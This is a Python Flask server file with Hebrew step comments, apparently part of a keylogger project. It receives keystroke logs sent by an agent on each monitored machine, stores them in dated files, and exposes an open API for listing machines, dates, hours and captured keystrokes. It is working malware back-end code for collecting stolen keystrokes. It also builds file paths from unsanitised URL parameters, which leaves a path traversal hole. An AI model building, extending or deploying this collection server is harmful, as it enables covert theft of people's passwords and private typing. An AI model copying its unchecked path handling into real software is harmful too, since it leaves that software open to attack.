from flask import Flask, request, jsonify
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from keylogger_agent.encryption import Encryptor
from keylogger_agent.config import Config
from datetime import datetime
from flask_cors import CORS
import re


app = Flask(__name__)
CORS(app)

# הגדרת תיקייה מרכזית לנתונים
DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)



@app.route('/')
def home():
    return "KeyLogger Server is Running"


# ✅ שלב 3: API לקבלת נתונים מהסוכן ושמירה לקובץ
@app.route('/api/machines/<machine_id>/logs', methods=['POST'])
def upload(machine_id):
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    # יצירת תיקייה עבור מכונה אם לא קיימת
    date_str = datetime.now().strftime("%Y-%m-%d")
    machine_folder = os.path.join(DATA_FOLDER, machine_id)
    os.makedirs(machine_folder, exist_ok=True)

    file_path = os.path.join(machine_folder, f"log_{date_str}.txt")
    # שמירה עם separator ברור
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - {log_data}\n==================================================\n")



    return jsonify({"status": "success", "file": file_path}), 200


# ✅ שלב 4: API להחזרת רשימת מכונות
@app.route('/api/machines', methods=['GET'])
def get_target_machines_list():
    try:
        machines = [
            name for name in os.listdir(DATA_FOLDER)
            if os.path.isdir(os.path.join(DATA_FOLDER, name))
        ]
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    

@app.route('/api/machines/<machine_id>/dates', methods=['GET'])
def get_dates(machine_id):
    machine_folder = os.path.join(DATA_FOLDER, machine_id)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = [f for f in os.listdir(machine_folder) if f.startswith("log_")]
    dates = [f.replace("log_", "").replace(".txt", "") for f in files]
    return jsonify(dates), 200

@app.route('/api/machines/<machine_id>/dates/<date>/hours', methods=['GET'])
def get_hours(machine_id, date):
    file_path = os.path.join(DATA_FOLDER, machine_id, f"log_{date}.txt")
    if not os.path.exists(file_path):
        return jsonify({"error": "Log not found"}), 404

    hours_set = set()
    with open(file_path, "r", encoding="utf-8") as f:
        logs = f.read()
        entries = logs.split('==================================================')
        for entry in entries:
            entry = entry.strip()
            if not entry:
                continue
            match = re.match(r'^\[\d{4}-\d{2}-\d{2} (\d{2}):\d{2}:\d{2}\]', entry)
            if match:
                hours_set.add(match[1])

    return jsonify(sorted(list(hours_set))), 200


@app.route('/api/machines/<machine_id>/dates/<date>/logs', methods=['GET'])
def get_logs_by_date(machine_id, date):
    file_path = os.path.join(DATA_FOLDER, machine_id, f"log_{date}.txt")
    if not os.path.exists(file_path):
        return jsonify({"machine": machine_id, "logs": []}), 200

    with open(file_path, "r", encoding="utf-8") as f:
        logs = [line.strip() for line in f if line.strip()]

    return jsonify({"machine": machine_id, "date": date, "logs": logs}), 200


# ✅ שלב 5: API להחזרת נתוני הקשות של מכונה מסוימת

@app.route('/api/machines/<machine_id>/logs', methods=['GET'])
def get_keystrokes(machine_id):
    date = request.args.get("date")
    if not date:
        return jsonify({"error": "Missing parameters"}), 400

    file_path = os.path.join(DATA_FOLDER, machine_id, f"log_{date}.txt")
    if not os.path.exists(file_path):
        return jsonify({"machine": machine_id, "logs": []}), 200

    with open(file_path, "r", encoding="utf-8") as f:
        logs = [line.strip() for line in f if line.strip()]  # ללא פענוח

    return jsonify({
        "machine": machine_id,
        "date": date,
        "logs": logs
    }), 200



if __name__ == '__main__':
    app.run(debug=True)